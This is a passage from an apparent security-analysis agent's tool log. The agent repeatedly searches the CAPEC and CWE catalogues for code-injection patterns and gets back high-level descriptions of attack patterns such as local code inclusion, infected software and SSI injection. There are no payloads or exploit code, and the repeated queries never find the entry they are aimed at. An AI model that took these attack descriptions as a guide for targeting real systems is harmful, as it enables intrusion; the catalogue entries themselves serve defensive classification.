<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-13 : Subverting Environment Variable Values". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-254 DEPRECATED: DTD Injection in a SOAP Message:
<Description>: This pattern has been deprecated as it was determined to be an unnecessary layer of abstraction. Please refer to the pattern CAPEC-228 : DTD Injection going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-19 Embedding Scripts within Scripts:
<Description>: An adversary leverages the capability to execute their own script by embedding it within other scripts that the target software is likely to execute due to programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. </Description>
<Prerequisites>: Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-251 Local Code Inclusion:
<Description>: The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways. </Description>
<Prerequisites>: The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture. | Some variants of this attack may require that old versions of some code files be present and in predictable locations. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-679 Exploitation of Improperly Configured or Implemented Memory Protections:
<Description>:  </Description>
<Prerequisites>: Access to the hardware being leveraged. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-387 Navigation Remapping To Propagate Malicious Content:
<Description>: An adversary manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic. </Description>
<Prerequisites>: Targeted software is utilizing application framework APIs </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-445 Malicious Logic Insertion into Product Software via Configuration Management Manipulation:
<Description>:  </Description>
<Prerequisites>: Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-10 Buffer Overflow via Environment Variables:
<Description>: This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the adversary finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables. </Description>
<Prerequisites>: The application uses environment variables. | An environment variable exposed to the user is vulnerable to a buffer overflow. | The vulnerable environment variable uses untrusted data. | Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer. </Prerequisites>
</CAPEC>


[6]========================Tool Call (Security Specialist)=========================
semantic_search_capec(query='CAPEC code injection eval injection template injection dynamic evaluation file parser arbitrary code execution via crafted file', n=15)

[6]=======================Tool Output (Security Specialist)========================

<CAPEC>
CAPEC-19 Embedding Scripts within Scripts:
<Description>: An adversary leverages the capability to execute their own script by embedding it within other scripts that the target software is likely to execute due to programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. </Description>
<Prerequisites>: Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-251 Local Code Inclusion:
<Description>: The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways. </Description>
<Prerequisites>: The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture. | Some variants of this attack may require that old versions of some code files be present and in predictable locations. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-443 Malicious Logic Inserted Into Product by Authorized Developer:
<Description>: An adversary uses their privileged position within an authorized development organization to inject malicious logic into a codebase or product. </Description>
<Prerequisites>: Access to the product during the initial or continuous development. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-10 Buffer Overflow via Environment Variables:
<Description>: This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the adversary finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables. </Description>
<Prerequisites>: The application uses environment variables. | An environment variable exposed to the user is vulnerable to a buffer overflow. | The vulnerable environment variable uses untrusted data. | Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-635 Alternative Execution Due to Deceptive Filenames:
<Description>: The extension of a file name is often used in various contexts to determine the application that is used to open and use it. If an attacker can cause an alternative application to be used, it may be able to execute malicious code, cause a denial of service or expose sensitive information. </Description>
<Prerequisites>: The use of the file must be controlled by the file extension. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-249 DEPRECATED: Linux Terminal Injection:
<Description>: This attack pattern has been deprecated as it is covered by "CAPEC-40 : Manipulating Writeable Terminal Devices". Please refer to this CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-679 Exploitation of Improperly Configured or Implemented Memory Protections:
<Description>:  </Description>
<Prerequisites>: Access to the hardware being leveraged. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-387 Navigation Remapping To Propagate Malicious Content:
<Description>: An adversary manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic. </Description>
<Prerequisites>: Targeted software is utilizing application framework APIs </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-264 DEPRECATED: Environment Variable Manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-13 : Subverting Environment Variable Values". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-101 Server Side Include (SSI) Injection:
<Description>: An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands. </Description>
<Prerequisites>: A web server that supports server side includes and has them enabled | User controllable input that can carry include directives to the web server </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-678 System Build Data Maliciously Altered:
<Description>:  </Description>
<Prerequisites>: An adversary has access to the data files and processes used for executing system configuration and performing the build. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-68 Subvert Code-signing Facilities:
<Description>: Many languages use code signing facilities to vouch for code's identity and to thus tie code to its assigned privileges within an environment. Subverting this mechanism can be instrumental in an attacker escalating privilege. Any means of subverting the way that a virtual machine enforces code signing classifies for this style of attack. </Description>
<Prerequisites>: A framework-based language that supports code signing (such as, and most commonly, Java or .NET) | Deployed code that has been signed by its authoring vendor, or a partner. | The attacker will, for most circumstances, also need to be able to place code in the victim container. This does not necessarily mean that they will have to subvert host-level security, except when explicitly indicated. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-445 Malicious Logic Insertion into Product Software via Configuration Management Manipulation:
<Description>:  </Description>
<Prerequisites>: Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-702 Exploiting Incorrect Chaining or Granularity of Hardware Debug Components:
<Description>:  </Description>
<Prerequisites>: Hardware device has an exposed debug interface </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-265 DEPRECATED: Global variable manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-77 : Manipulating User-Controlled Variables". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


[7]========================Tool Call (Security Specialist)=========================
semantic_search_capec(query='CAPEC code injection dynamic code evaluation eval injection malicious file parsing', n=20)

[7]=======================Tool Output (Security Specialist)========================

<CAPEC>
CAPEC-443 Malicious Logic Inserted Into Product by Authorized Developer:
<Description>: An adversary uses their privileged position within an authorized development organization to inject malicious logic into a codebase or product. </Description>
<Prerequisites>: Access to the product during the initial or continuous development. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-679 Exploitation of Improperly Configured or Implemented Memory Protections:
<Description>:  </Description>
<Prerequisites>: Access to the hardware being leveraged. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-387 Navigation Remapping To Propagate Malicious Content:
<Description>: An adversary manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic. </Description>
<Prerequisites>: Targeted software is utilizing application framework APIs </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-635 Alternative Execution Due to Deceptive Filenames:
<Description>: The extension of a file name is often used in various contexts to determine the application that is used to open and use it. If an attacker can cause an alternative application to be used, it may be able to execute malicious code, cause a denial of service or expose sensitive information. </Description>
<Prerequisites>: The use of the file must be controlled by the file extension. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-251 Local Code Inclusion:
<Description>: The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways. </Description>
<Prerequisites>: The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture. | Some variants of this attack may require that old versions of some code files be present and in predictable locations. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-442 Infected Software:
<Description>: An adversary adds malicious logic, often in the form of a computer virus, to otherwise benign software. This logic is often hidden from the user of the software and works behind the scenes to achieve negative impacts. Many times, the malicious logic is inserted into empty space between legitimate code, and is then called when the software is executed. This pattern of attack focuses on software already fielded and used in operation as opposed to software that is still under development and part of the supply chain. </Description>
<Prerequisites>: Access to the software currently deployed at a victim location. This access is often obtained by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-445 Malicious Logic Insertion into Product Software via Configuration Management Manipulation:
<Description>:  </Description>
<Prerequisites>: Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-10 Buffer Overflow via Environment Variables:
<Description>: This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the adversary finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables. </Description>
<Prerequisites>: The application uses environment variables. | An environment variable exposed to the user is vulnerable to a buffer overflow. | The vulnerable environment variable uses untrusted data. | Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-678 System Build Data Maliciously Altered:
<Description>:  </Description>
<Prerequisites>: An adversary has access to the data files and processes used for executing system configuration and performing the build. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-542 Targeted Malware:
<Description>: An adversary develops targeted malware that takes advantage of a known vulnerability in an organizational information technology environment. The malware crafted for these attacks is based specifically on information gathered about the technology environment. Successfully executing the malware enables an adversary to achieve a wide variety of negative technical impacts. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-19 Embedding Scripts within Scripts:
<Description>: An adversary leverages the capability to execute their own script by embedding it within other scripts that the target software is likely to execute due to programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. </Description>
<Prerequisites>: Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-249 DEPRECATED: Linux Terminal Injection:
<Description>: This attack pattern has been deprecated as it is covered by "CAPEC-40 : Manipulating Writeable Terminal Devices". Please refer to this CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-264 DEPRECATED: Environment Variable Manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-13 : Subverting Environment Variable Values". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-702 Exploiting Incorrect Chaining or Granularity of Hardware Debug Components:
<Description>:  </Description>
<Prerequisites>: Hardware device has an exposed debug interface </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-136 LDAP Injection:
<Description>: An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value. </Description>
<Prerequisites>: The target application must accept a string as user input, fail to sanitize characters that have a special meaning in LDAP queries in the user input, and insert the user-supplied string in an LDAP query which is then processed. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-68 Subvert Code-signing Facilities:
<Description>: Many languages use code signing facilities to vouch for code's identity and to thus tie code to its assigned privileges within an environment. Subverting this mechanism can be instrumental in an attacker escalating privilege. Any means of subverting the way that a virtual machine enforces code signing classifies for this style of attack. </Description>
<Prerequisites>: A framework-based language that supports code signing (such as, and most commonly, Java or .NET) | Deployed code that has been signed by its authoring vendor, or a partner. | The attacker will, for most circumstances, also need to be able to place code in the victim container. This does not necessarily mean that they will have to subvert host-level security, except when explicitly indicated. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-247 XSS Using Invalid Characters:
<Description>: An adversary inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the adversary to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results. </Description>
<Prerequisites>: The target must fail to remove invalid characters from input and fail to adequately scan beyond these characters. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-503 WebView Exposure:
<Description>: An adversary, through a malicious web page, accesses application specific functionality by leveraging interfaces registered through WebView's addJavascriptInterface API. Once an interface is registered to WebView through addJavascriptInterface, it becomes global and all pages loaded in the WebView can call this interface. </Description>
<Prerequisites>: This type of an attack requires the adversary to convince the user to load the malicious web page inside the target application. Once loaded, the malicious web page will have the same permissions as the target application and will have access to all registered interfaces. Both the permission and the interface must be in place for the functionality to be exposed. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-17 Using Malicious Files:
<Description>: An attack of this type exploits a system's configuration that allows an adversary to either directly access an executable file, for example through shell access; or in a possible worst case allows an adversary to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface. </Description>
<Prerequisites>: System's configuration must allow an attacker to directly access executable files or upload files to execute. This means that any access control system that is supposed to mediate communications between the subject and the object is set incorrectly or assumes a benign environment. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-21 Exploitation of Trusted Identifiers:
<Description>:  </Description>
<Prerequisites>: Server software must rely on weak identifier proof and/or verification schemes. | Identifiers must have long lifetimes and potential for reusability. | Server software must allow concurrent sessions to exist. </Prerequisites>
</CAPEC>


[8]========================Tool Call (Security Specialist)=========================
semantic_search_capec(query='CAPEC code injection eval injection dynamical evaluation, eval, template injection, arbitrary code execution via crafted file; code injection pattern CAPEC', n=10)

[8]=======================Tool Output (Security Specialist)========================

<CAPEC>
CAPEC-443 Malicious Logic Inserted Into Product by Authorized Developer:
<Description>: An adversary uses their privileged position within an authorized development organization to inject malicious logic into a codebase or product. </Description>
<Prerequisites>: Access to the product during the initial or continuous development. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-264 DEPRECATED: Environment Variable Manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-13 : Subverting Environment Variable Values". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-19 Embedding Scripts within Scripts:
<Description>: An adversary leverages the capability to execute their own script by embedding it within other scripts that the target software is likely to execute due to programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. </Description>
<Prerequisites>: Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-251 Local Code Inclusion:
<Description>: The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways. </Description>
<Prerequisites>: The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture. | Some variants of this attack may require that old versions of some code files be present and in predictable locations. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-265 DEPRECATED: Global variable manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-77 : Manipulating User-Controlled Variables". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-10 Buffer Overflow via Environment Variables:
<Description>: This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the adversary finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables. </Description>
<Prerequisites>: The application uses environment variables. | An environment variable exposed to the user is vulnerable to a buffer overflow. | The vulnerable environment variable uses untrusted data. | Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-171 DEPRECATED: Variable Manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-77 : Manipulating User-Controlled Variables". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-249 DEPRECATED: Linux Terminal Injection:
<Description>: This attack pattern has been deprecated as it is covered by "CAPEC-40 : Manipulating Writeable Terminal Devices". Please refer to this CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-442 Infected Software:
<Description>: An adversary adds malicious logic, often in the form of a computer virus, to otherwise benign software. This logic is often hidden from the user of the software and works behind the scenes to achieve negative impacts. Many times, the malicious logic is inserted into empty space between legitimate code, and is then called when the software is executed. This pattern of attack focuses on software already fielded and used in operation as opposed to software that is still under development and part of the supply chain. </Description>
<Prerequisites>: Access to the software currently deployed at a victim location. This access is often obtained by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-445 Malicious Logic Insertion into Product Software via Configuration Management Manipulation:
<Description>:  </Description>
<Prerequisites>: Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have. </Prerequisites>
</CAPEC>


[9]========================Tool Call (Security Specialist)=========================
semantic_search_cwe(query='CWE incomplete blacklist incomplete list of disallowed inputs, partial escaping, blacklist, insufficient sanitization', n=5)

[9]=======================Tool Output (Security Specialist)========================

<CWE>
CWE-184 Incomplete List of Disallowed Inputs:
<Description>: The product implements a protection mechanism that relies on a list of inputs (or properties of inputs) that are not allowed by policy or otherwise require other action to neutralize before additional processing takes place, but the list is incomplete. </Description>
<Extended>: N/A </Extended>
</CWE>


<CWE>
CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'):
<Description>: The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. </Description>
<Extended>:  </Extended>
</CWE>


<CWE>
CWE-20 Improper Input Validation:
<Description>: The product receives input or data, but it does
        not validate or incorrectly validates that the input has the
        properties that are required to process the data safely and
        correctly. </Description>
<Extended>:  </Extended>
</CWE>


<CWE>
CWE-156 Improper Neutralization of Whitespace:
<Description>: The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as whitespace when they are sent to a downstream component. </Description>
<Extended>: This can include space, tab, etc. </Extended>
</CWE>


<CWE>
CWE-150 Improper Neutralization of Escape, Meta, or Control Sequences:
<Description>: The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as escape, meta, or control character sequences when they are sent to a downstream component. </Description>
<Extended>: As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions. </Extended>
</CWE>


[10]========================Tool Call (Security Specialist)=========================
semantic_search_capec(query='CAPEC code injection arbitrary code execution via injection into application, dynamic evaluation, eval injection, template injection', n=10)

[10]=======================Tool Output (Security Specialist)========================

<CAPEC>
CAPEC-251 Local Code Inclusion:
<Description>: The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways. </Description>
<Prerequisites>: The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture. | Some variants of this attack may require that old versions of some code files be present and in predictable locations. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-443 Malicious Logic Inserted Into Product by Authorized Developer:
<Description>: An adversary uses their privileged position within an authorized development organization to inject malicious logic into a codebase or product. </Description>
<Prerequisites>: Access to the product during the initial or continuous development. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-387 Navigation Remapping To Propagate Malicious Content:
<Description>: An adversary manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic. </Description>
<Prerequisites>: Targeted software is utilizing application framework APIs </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-10 Buffer Overflow via Environment Variables:
<Description>: This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the adversary finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables. </Description>
<Prerequisites>: The application uses environment variables. | An environment variable exposed to the user is vulnerable to a buffer overflow. | The vulnerable environment variable uses untrusted data. | Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-19 Embedding Scripts within Scripts:
<Description>: An adversary leverages the capability to execute their own script by embedding it within other scripts that the target software is likely to execute due to programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. </Description>
<Prerequisites>: Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-679 Exploitation of Improperly Configured or Implemented Memory Protections:
<Description>:  </Description>
<Prerequisites>: Access to the hardware being leveraged. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-445 Malicious Logic Insertion into Product Software via Configuration Management Manipulation:
<Description>:  </Description>
<Prerequisites>: Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-101 Server Side Include (SSI) Injection:
<Description>: An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands. </Description>
<Prerequisites>: A web server that supports server side includes and has them enabled | User controllable input that can carry include directives to the web server </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-702 Exploiting Incorrect Chaining or Granularity of Hardware Debug Components:
<Description>:  </Description>
<Prerequisites>: Hardware device has an exposed debug interface </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-264 DEPRECATED: Environment Variable Manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-13 : Subverting Environment Variable Values". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


[11]========================Tool Call (Security Specialist)=========================
semantic_search_capec(query='CAPEC code injection general pattern arbitrary code execution via code injection', n=10)

[11]=======================Tool Output (Security Specialist)========================

<CAPEC>
CAPEC-10 Buffer Overflow via Environment Variables:
<Description>: This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the adversary finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables. </Description>
<Prerequisites>: The application uses environment variables. | An environment variable exposed to the user is vulnerable to a buffer overflow. | The vulnerable environment variable uses untrusted data. | Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-251 Local Code Inclusion:
<Description>: The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways. </Description>
<Prerequisites>: The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture. | Some variants of this attack may require that old versions of some code files be present and in predictable locations. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-443 Malicious Logic Inserted Into Product by Authorized Developer:
<Description>: An adversary uses their privileged position within an authorized development organization to inject malicious logic into a codebase or product. </Description>
<Prerequisites>: Access to the product during the initial or continuous development. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-679 Exploitation of Improperly Configured or Implemented Memory Protections:
<Description>:  </Description>
<Prerequisites>: Access to the hardware being leveraged. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-445 Malicious Logic Insertion into Product Software via Configuration Management Manipulation:
<Description>:  </Description>
<Prerequisites>: Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-265 DEPRECATED: Global variable manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-77 : Manipulating User-Controlled Variables". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-442 Infected Software:
<Description>: An adversary adds malicious logic, often in the form of a computer virus, to otherwise benign software. This logic is often hidden from the user of the software and works behind the scenes to achieve negative impacts. Many times, the malicious logic is inserted into empty space between legitimate code, and is then called when the software is executed. This pattern of attack focuses on software already fielded and used in operation as opposed to software that is still under development and part of the supply chain. </Description>
<Prerequisites>: Access to the software currently deployed at a victim location. This access is often obtained by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-264 DEPRECATED: Environment Variable Manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-13 : Subverting Environment Variable Values". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-19 Embedding Scripts within Scripts:
<Description>: An adversary leverages the capability to execute their own script by embedding it within other scripts that the target software is likely to execute due to programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. </Description>
<Prerequisites>: Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-387 Navigation Remapping To Propagate Malicious Content:
<Description>: An adversary manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic. </Description>
<Prerequisites>: Targeted software is utilizing application framework APIs </Prerequisites>
</CAPEC>


[12]========================Tool Call (Security Specialist)=========================
semantic_search_capec(query='CAPEC Code Injection general pattern', n=5)

[12]=======================Tool Output (Security Specialist)========================

<CAPEC>
CAPEC-443 Malicious Logic Inserted Into Product by Authorized Developer:
<Description>: An adversary uses their privileged position within an authorized development organization to inject malicious logic into a codebase or product. </Description>
<Prerequisites>: Access to the product during the initial or continuous development. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-445 Malicious Logic Insertion into Product Software via Configuration Management Manipulation:
<Description>:  </Description>
<Prerequisites>: Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-264 DEPRECATED: Environment Variable Manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-13 : Subverting Environment Variable Values". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-629 DEPRECATED: Unauthorized Use of Device Resources:
<Description>: This attack pattern has been deprecated. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-265 DEPRECATED: Global variable manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-77 : Manipulating User-Controlled Variables". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


[13]========================Tool Call (Security Specialist)=========================
semantic_search_capec(query="eval injection CAPEC 'Eval Injection' dynamically evaluated code", n=10)

[13]=======================Tool Output (Security Specialist)========================

<CAPEC>
CAPEC-264 DEPRECATED: Environment Variable Manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-13 : Subverting Environment Variable Values". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-443 Malicious Logic Inserted Into Product by Authorized Developer:
<Description>: An adversary uses their privileged position within an authorized development organization to inject malicious logic into a codebase or product. </Description>
<Prerequisites>: Access to the product during the initial or continuous development. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-171 DEPRECATED: Variable Manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-77 : Manipulating User-Controlled Variables". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
